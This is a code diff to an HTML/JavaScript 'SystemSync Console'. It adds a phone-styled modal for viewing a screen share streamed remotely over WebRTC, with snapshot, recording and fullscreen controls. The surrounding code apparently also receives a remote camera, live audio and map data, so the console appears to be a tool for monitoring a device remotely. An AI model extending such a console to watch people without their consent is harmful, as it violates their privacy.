@@ -4,7 +4,7 @@
     <title>SystemSync Console</title>
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
     <style>
-        /* (keep your existing CSS – unchanged) */
+        /* ---------- your existing styles ---------- */
         body{
             margin:0;
             background:#f5f7fa;
@@ -382,9 +382,93 @@
             cursor: pointer;
             margin-left: 10px;
         }
+
+        /* ---------- MODAL / POPUP STYLES ---------- */
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.7);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 10000;
+        }
+        .modal-overlay.show {
+            display: flex;
+        }
+        .mobile-popup {
+            width: 360px;           /* typical phone width */
+            max-width: 90%;
+            background: #1a1a1a;
+            border-radius: 36px;     /* curved like a phone */
+            padding: 20px 15px 25px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.5);
+            border: 2px solid #444;
+            position: relative;
+            color: white;
+        }
+        .mobile-popup video {
+            width: 100%;
+            aspect-ratio: 16/9;      /* 16:9 exactly */
+            background: black;
+            border-radius: 16px;
+            margin-bottom: 15px;
+            object-fit: contain;
+        }
+        .popup-controls {
+            display: flex;
+            gap: 10px;
+            justify-content: center;
+            margin-bottom: 15px;
+            flex-wrap: wrap;
+        }
+        .popup-controls button {
+            width: auto;
+            margin: 0;
+            padding: 8px 16px;
+            background: #333;
+            color: white;
+            border: none;
+            border-radius: 30px;
+            font-size: 13px;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+        .popup-controls button:hover {
+            background: #1976ff;
+        }
+        .popup-controls button.close-btn {
+            background: #d32f2f;
+        }
+        .popup-controls button.close-btn:hover {
+            background: #b71c1c;
+        }
+        /* prevent clicks on background when modal is open */
+        body.modal-open #sidebar,
+        body.modal-open #main {
+            pointer-events: none;
+            filter: blur(2px);
+            transition: filter 0.3s;
+        }
     </style>
 </head>
 <body>
+
+<!-- MODAL OVERLAY (for screen share) -->
+<div id="screenModalOverlay" class="modal-overlay">
+    <div class="mobile-popup">
+        <video id="modalScreenVideo" autoplay playsinline></video>
+        <div class="popup-controls">
+            <button id="modalFullscreenBtn">⛶</button>
+            <button id="modalSnapBtn">📸 Snap</button>
+            <button id="modalRecordBtn">⏺ Record</button>
+            <button id="modalCloseBtn" class="close-btn">✖ Close</button>
+        </div>
+    </div>
+</div>
 
 <div id="sidebar">
     <div class="logo">SystemSync</div>
@@ -488,6 +572,13 @@
     const panel = document.getElementById('main-panel');
     const statusEl = document.getElementById('status');
 
+    // Modal elements
+    const modalOverlay = document.getElementById('screenModalOverlay');
+    const modalVideo = document.getElementById('modalScreenVideo');
+    const modalSnapBtn = document.getElementById('modalSnapBtn');
+    const modalRecordBtn = document.getElementById('modalRecordBtn');
+    const modalCloseBtn = document.getElementById('modalCloseBtn');
+
     // ---------- ICE SERVERS ----------
     const ICE_SERVERS = [
         { urls: "stun:stun.relay.metered.ca:80" },
@@ -543,6 +634,8 @@
                 if (streamType === 'screen') {
                     screenActive = false;
                     document.getElementById('screenBtn').innerText = 'Start Screen';
+                    // Also close modal if it's open
+                    closeScreenModal();
                 }
             }
         };
@@ -578,7 +671,22 @@
         }
     }
 
-    // ---------- SCREEN SHARE ----------
+    // ---------- MODAL CONTROL ----------
+    function openScreenModal() {
+        modalOverlay.classList.add('show');
+        document.body.classList.add('modal-open');
+    }
+
+    function closeScreenModal() {
+        modalOverlay.classList.remove('show');
+        document.body.classList.remove('modal-open');
+        // Stop screen share if still active
+        if (screenActive) {
+            toggleScreen();  // this will send STOP_SCREEN and clean up
+        }
+    }
+
+    // ---------- SCREEN SHARE (modified for modal) ----------
     async function toggleScreen() {
         console.log('toggleScreen called, current screenActive:', screenActive);
         if (screenActive) {
@@ -589,19 +697,17 @@
             }
             document.getElementById('screenBtn').innerText = 'Start Screen';
             screenActive = false;
-            panel.innerHTML = 'Ready.';
+            closeScreenModal(); // close the modal
             sendSignalingMessage({ type: 'STOP_SCREEN' });
         } else {
-            panel.innerHTML = '<h2>Starting screen share...</h2>';
+            // Start screen share - open modal first (video will appear when track arrives)
+            openScreenModal();
+            // Clear any previous video source
+            modalVideo.srcObject = null;
+
             screenPC = createPeerConnection('screen', (e) => {
-                panel.innerHTML = `
-                    <video autoplay playsinline style="width:100%; height:auto;"></video>
-                    <div class="live-controls">
-                        <button onclick="snapScreen()">📸 Snap Screen</button>
-                        <button class="stop" onclick="toggleScreen()">⏹ Stop Screen</button>
-                    </div>
-                `;
-                document.querySelector('video').srcObject = e.streams[0];
+                // When track arrives, attach to modal video
+                modalVideo.srcObject = e.streams[0];
                 console.log('ontrack for screen', e.streams);
             }, false);
 
@@ -619,22 +725,21 @@
                 console.error('Screen share failed:', e);
                 showNotification('Failed: ' + e.message);
                 screenPC = null;
-                panel.innerHTML = 'Ready.';
+                closeScreenModal();
             }
         }
     }
 
-    // ---------- SNAP SCREEN ----------
-    function snapScreen() {
-        const video = document.querySelector('video');
-        if (!video || !video.videoWidth) {
+    // ---------- SNAP SCREEN (from modal) ----------
+    function snapScreenFromModal() {
+        if (!modalVideo || !modalVideo.videoWidth) {
             alert('No active screen share or video not ready');
             return;
         }
         const canvas = document.createElement('canvas');
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        canvas.getContext('2d').drawImage(video, 0, 0);
+        canvas.width = modalVideo.videoWidth;
+        canvas.height = modalVideo.videoHeight;
+        canvas.getContext('2d').drawImage(modalVideo, 0, 0);
         canvas.toBlob(blob => {
             const url = URL.createObjectURL(blob);
             const a = document.createElement('a');
@@ -644,6 +749,75 @@
             URL.revokeObjectURL(url);
         }, 'image/png');
     }
+
+    // ---------- RECORD SCREEN (from modal) ----------
+    let screenMediaRecorder = null;
+    let screenRecordedChunks = [];
+
+    function toggleScreenRecording() {
+        if (screenMediaRecorder && screenMediaRecorder.state === 'recording') {
+            screenMediaRecorder.stop();
+            modalRecordBtn.innerText = '⏺ Record';
+        } else {
+            if (!modalVideo.srcObject) {
+                alert('No screen stream');
+                return;
+            }
+            screenRecordedChunks = [];
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+            const stream = modalVideo.srcObject;
+
+            if (modalVideo.videoWidth === 0) {
+                modalVideo.onloadedmetadata = () => startScreenRecording(canvas, ctx, stream);
+            } else {
+                startScreenRecording(canvas, ctx, stream);
+            }
+        }
+    }
+// fullscreen toggle function
+function toggleFullscreen() {
+    if (!document.fullscreenElement) {
+        modalVideo.requestFullscreen().catch(err => console.error('Fullscreen error:', err));
+    } else {
+        document.exitFullscreen();
+    }
+}
+modalFullscreenBtn.addEventListener('click', toggleFullscreen);
+    function startScreenRecording(canvas, ctx, originalStream) {
+        canvas.width = modalVideo.videoWidth;
+        canvas.height = modalVideo.videoHeight;
+
+        function drawVideoFrame() {
+            ctx.drawImage(modalVideo, 0, 0, canvas.width, canvas.height);
+            requestAnimationFrame(drawVideoFrame);
+        }
+        drawVideoFrame();
+
+        const canvasStream = canvas.captureStream(30);
+        // Add audio tracks if any (screen share usually doesn't have audio, but just in case)
+        originalStream.getAudioTracks().forEach(track => canvasStream.addTrack(track));
+
+        screenMediaRecorder = new MediaRecorder(canvasStream, { mimeType: 'video/webm' });
+        screenMediaRecorder.ondataavailable = (e) => screenRecordedChunks.push(e.data);
+        screenMediaRecorder.onstop = () => {
+            const blob = new Blob(screenRecordedChunks, { type: 'video/webm' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `screen_rec_${Date.now()}.webm`;
+            a.click();
+            URL.revokeObjectURL(url);
+            canvasStream.getTracks().forEach(track => track.stop());
+        };
+        screenMediaRecorder.start();
+        modalRecordBtn.innerText = '⏹ Stop Rec';
+    }
+
+    // Attach modal button listeners
+    modalSnapBtn.addEventListener('click', snapScreenFromModal);
+    modalRecordBtn.addEventListener('click', toggleScreenRecording);
+    modalCloseBtn.addEventListener('click', closeScreenModal);
 
     // ---------- LIVE CAMERA ----------
     async function startLiveStream() {
@@ -685,14 +859,14 @@
         }
     }
 
-function stopLiveStream() {
-    if (cameraPC) {
-        cameraPC.close();
-        cameraPC = null;
+    function stopLiveStream() {
+        if (cameraPC) {
+            cameraPC.close();
+            cameraPC = null;
+        }
+        sendSignalingMessage({ type: 'STOP_CAMERA' });
+        panel.innerHTML = 'Ready.';
     }
-    sendSignalingMessage({ type: 'STOP_CAMERA' });
-    panel.innerHTML = 'Ready.';
-}
 
     // ---------- LIVE AUDIO ----------
     async function toggleLiveAudio() {
@@ -1365,7 +1539,7 @@ function startCanvasRecording(video, canvas, ctx, originalStream) {
     window.updateSelected = updateSelected;
     window.downloadSelected = downloadSelected;
     window.connectWebSocket = connectWebSocket;
-    window.snapScreen = snapScreen;
+    window.snapScreen = snapScreenFromModal; // exposed if needed elsewhere
 
     document.getElementById('screenShareBtn').addEventListener('click', toggleScreen);
 
@@ -1374,5 +1548,3 @@ function startCanvasRecording(video, canvas, ctx, originalStream) {
 </script>
 </body>
 </html>
-
-
